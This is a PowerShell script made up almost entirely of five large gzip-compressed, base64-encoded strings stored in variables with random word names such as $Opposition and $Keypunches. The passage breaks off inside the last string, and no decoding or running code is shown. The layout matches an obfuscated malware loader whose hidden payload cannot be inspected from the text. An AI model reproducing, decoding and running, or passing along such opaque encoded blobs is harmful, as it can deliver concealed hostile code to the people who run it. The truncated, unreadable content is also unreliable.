#Requires -Version 2

$Opposition = "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"
$Keypunches = "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"
$Outstretch = "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"
$Redeemable = "H4sIAAAAAAAEANVa3U/jOBB/R9r/IQ+VoNLSB0DcaqWTrl9wvSuFa1L6gBAKyQA+0jhynEKl++Nv7CRN0jpO0vZWe31pmrFnfjMez4fd1lXkO5xQfwAvxCfiKTR+NX47+XJk4OdkAh+n6RDDdpd2QM7PjNsAfLN/Y/v2KzDj5GHk8zvOHts478HkjPivj1+N3NMMB5yfIf3kYRr5nCygg2+A0cAEtiQOhJ2+7Xk4uk/9JfhC2uP373PiozztrDebmcBx7MwnDnWhbZzi77Ed8iFjlLW/avX4KwK2SpjdPv8NDjfBiRjhK5TZo9SLVUrUEyol5E7XQfEhouWMep309ch/oaEY11txeHjMqZ49dW7sd+itpvBirQI4aTdD3PdoCAni323f9UCFtBlPsZp3jAqFLPoOfonumSbJu/00uQYupQmbsYUtiTUFH96sY0rfowAXlaKjmcQtIMn8OOcIq5DDomPBJ+/E9F5EPBeYBtLu05BwEAXvGFkSD15hYi8g3rcbKrbGs9HgQMAbejYDd+hHC2A2Vzp1nVU/lHMKMFcMBI4lJW5xc1XMHYXCSkk82lWRKiEyTjLhqhaN1wMf5yXSDmKSURwcphCiOIeDu3/gwRCQj5zIcJ0o9NYq1+lHURq6U7JaibIDCB1GAk7ZevG2KHUdJ8uzCvClG/Mny8OpfUpsgVbS22er0tAu6f/FKmJ7ENeMnrsRf6NJVZIvtbbcYl/+fZH+1EIUrFXMSfDmBcheMO+6doAGCbuuy7C2gHBjg2u2tSrX1wyReQTDTw6+C67lBJb9LGslbYRROIt0sjzEltW/e7K6vfHwqT/ummZD66vgzdwDwpsNCvAMLT4VwndgPnhxEsRUfEU8KC3x9Uuoof4sm22tLC5HP2IMBSalcFHnEmdbT8/V0BvGylTfWKtm+IQA6w1XxP1v+KP+Cf6Rq/bDxvxiuIdhN4gCjzjojuumRx0INU/lmWBf28mmbM9urGA44rzLUHx5kdju8qKWF+LcK8IWHzaDob8kjPoLdOh7mxFFeFE16rtlFJV8YeOCMfZpEtYCxtSxvaQwVyWpiumy3x/QcAAiZpTao8oKxukQ+/7VHSWYLYs85xUI5vTj8mJAQrEe8vkqnIJLGDhlDfChypRyDfSY6ig0BVG+1dOnEkkZs7J85XPX84wp9yZYQNo8wj4FlyNmriw42gWZyolqpdeSRj5JG7zYa4ru2JpNRv3bwfDJtKajybWqnY59bQvJFmMdkAmXvhcfXMUIdL1Ts8OTHK6CHD0gkaUGcsGoFpguFrdue38M+9ZT10Lr9WbW0KyCp5Baw251cJaYLc0WG1mjSa+hMHBzFeJTmeIJmrLA3nfttwSVbcalHXnc8YhxLx7W5znyV2X936j9zoFUyVJbrwhP+I18qHHyUAEkyICsudaBsEY9QvtuGqjBqu1mKim0DkxM7GLsL6UAryPiakDpO7tG4BMoDVB/OzDqH4Y/KXTUxfMmXzG4DlNZrGq8voYKGYuyMPBB/DDA4Nhx2dLA/v8OcxmWKgNGMLcPP+se3hQqMNHghcCNbsSppobYlqa2SgGi2BGFWWEJxFpgd8wINRXcxlpDwQF4wKEwrVLDrEipiUwhZDdopR6iX4jGvqIUXQNy5mM1TkayLdvYg5tar2m9XZhcQ5jc+DvKys8tDRueLZoVY47fIo2ue2p12bC18XbNikV5JYbIYSs2/OrcoozUG5OrJYnNLru8F9vZOkDVJKdqfYucq5GI/HIDCyxPEcX91qXYFv9sfDXv+PDphXgwJmF5NSbT9W7aFiU0QVSJRnk93PRKpm49XsRWuo94GB/xzy1zXeyZEIbi7x0bwbXOJtrrVkXT7ivRlRyh5HXKfGtDGX0FoQOSZzlvfzlqC8u2hA7i/zAt1d9k/hGR+nRO/PMzedp1ekPdCB2mlXyfilv2MMDtZRzjqG5AYkJngi3UEqXxN+qGxyimm17JoCQp8uE4vaU5fkT6KL00yOjpPYKk/5mexmT09IBG0ieyacRPRpd9pCTep+VhRkwrRkmfJxkgR88nhXhMsnXyY+JXMTlduxw5eSXoR/8C7HXSxYYkAAA="
$Preservers = "H4sIAAAAAAAEAOVbeXPaSBb/P1XzHXq0VBlipMFHUlue8VQRwA672FCA48p6KCKjxtZGqFlJ+FiPv/u+bl19SeAju65aKglI6u53/d7Rr5X5yp9FLvFR178h37E5IK4fNX1nEMB3527pETdCDz+9++kdgs9Fa+F4OPrk+o7rX1Vrk/j20g7sBarGF2zcgN7BEQ6qJ7bv2BEJ7g8rUbDC6RQ26ovtufAQj2aBu4yqD+hidB9GeGF1+9bAjq4nBwfdkP4YEhJhp1qZ1tCjsEIYAZ9XE1Rpex4dGD+qxV/xv5f4yvWpCOmkyim+bQfuDQ5OgUd0iC6OV64DtOA+/VWt6cYmBGB4xV95nm5IK8AgjEOHzG0vxPGYR56ZZUBmOAx5ds4DN8LmZxJGyLh4P0Edf7XAgR2BXDAcrIAD5LD1Q8uyjNQUjHRMt+fCXBCDXP4Tz6KLyQRVj3Fknrv+aEmIN4gXiccis+vPSQ/fYA/tIrMTBCT4Ygeufelh1LPDiN1JHjRjaIxcD/uRd98iPnAFNuR5cOeoyjSCTPwvnqMaehBlMyfoyIalHBQRhBMpsSxjpcpWzFihyxjCDeOxZhm/ogBHq8BP1ZurWKfTI7LyHVSpcuxZLbgHTMoq3lDB/JM/0fk1DrDZZ4+B38rUih8zxJie+x0j4/0RyD7ESxK61B3eGwBlhVLXd/AdkKL2G4LnkAUyT1zfXawWqAE/7Tv2U5FDWYiCMB90wS8/4SWUNXUWqrhDW5nmLOoytS1kh8hG4KlLD0yowDLzCIo14ASuU+VU2sPul85w2j096k93i+ZYX8AUFHqHaA/9BY2vMSLL1ClCFiPQTTJkDnC9vXZn1yiCYQnHt8DgLYgWYd9i08PVckkC6p03trfCyA3RnlVIPgkMYqQoHN3xb9yA+Atwklzt/N3CmRxK8on5zeJ5dmRTOLFZfOTTjAWvnbtXyuhiCDQjalimanDUGQtqMiJuXWDZp1q